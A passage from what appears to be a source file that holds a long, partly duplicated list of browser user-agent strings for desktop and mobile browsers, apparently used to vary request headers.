     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN',
     'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac https://m.baidu.com/mip/c/s/zhangzifan.com/wechat-user-agent.htmlOS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 MicroMessenger/6.6.1 NetType/4G Language/zh_CN',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Mobile/15B150 MicroMessenger/6.6.1 NetType/WIFI Language/zh_CN',
     "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	 "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
	 "Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	 "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	 "Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
	 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
	 "Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 6.0.1; SM919 Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1.1; vivo X6S A Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN",
	 "Mozilla/5.0 (Linux; Android 5.1; HUAWEI TAG-AL00 Build/HUAWEITAG-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043622 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN",
     'Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN'
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
     'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2',
     'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
     'Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3',
     'Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0',
     'Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)',
     'Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10',
     'Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9',
     'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5', 'Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.8',
     'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20', 'Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a', 'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2', 'Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1',
     'Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1', 'Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre',
     'Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2', 'Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0', 'Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5',
     'Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre',
     'Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0',
     'Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1',
     'Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0',
     'Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15',
     'Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko',
     'Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16',
     'Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025',
     'Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1',
     'Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020',
     'Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1',
     'Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)',
     'Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8',
     'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.613.0 Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040614 Firefox/0.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Debian/1.6-7',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Epiphany/1.2.8',
     'Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060909 Firefox/1.5.0.7 MG(Novarra-Vision/6.9)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.16) Gecko/20080716 (Gentoo) Galeon/2.0.6',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1) Gecko/20061024 Firefox/2.0 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Galeon/2.0.6 (Ubuntu 2.0.6-2)',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.2) Gecko/20090803 Ubuntu/9.04 (jaunty) Shiretoko/3.5.2',
     'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9a3pre) Gecko/20070330',
     'Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.2.3) Gecko/20100406 Firefox/3.6.3 (Swiftfox)',
     'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.2) Gecko/20121223 Ubuntu/9.25 (jaunty) Firefox/3.8',
     'Mozilla/5.0 (X11; U; Linux i686; pt-PT; rv:1.9.2.3) Gecko/20100402 Iceweasel/3.6.3 (like Firefox/3.6.3) GTB7.0',
     'Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 (Debian-3.0.1-1)',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.13) Gecko/20100916 Iceape/2.0.8',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20091020 Linux Mint/8 (Helena) Firefox/3.5.3',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.5) Gecko/20091107 Firefox/3.5.5',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.9) Gecko/20100915 Gentoo Firefox/3.6.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; sv-SE; rv:1.8.1.12) Gecko/20080207 Ubuntu/7.10 (gutsy) Firefox/2.0.0.12',
     'Mozilla/5.0 (X11; U; Linux x86_64; us; rv:1.9.1.19) Gecko/20110430 shadowfox/7.0 (like Firefox/7.0',
     'Mozilla/5.0 (X11; U; NetBSD amd64; en-US; rv:1.9.2.15) Gecko/20110308 Namoroka/3.6.15',
     'Mozilla/5.0 (X11; U; OpenBSD arm; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.359.0 Safari/533.3',
     'Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.9.1) Gecko/20090702 Firefox/3.5',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.12) Gecko/20080303 SeaMonkey/1.1.8',
     'Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.9.1b3) Gecko/20090429 Firefox/3.1b3',
     'Mozilla/5.0 (X11; U; SunOS sun4m; en-US; rv:1.4b) Gecko/20030517 Mozilla Firebird/0.6',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.309.0 Safari/532.9',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/10.0.613.0 Safari/534.15',
     'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7', 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML, like Gecko) Ubuntu/10.10 Chrome/9.1.0.0 Safari/540.0', 'Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN', 'Mozilla/5.0 (Linux; Android 7.1.1; OD103 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/4G Language/zh_CN',
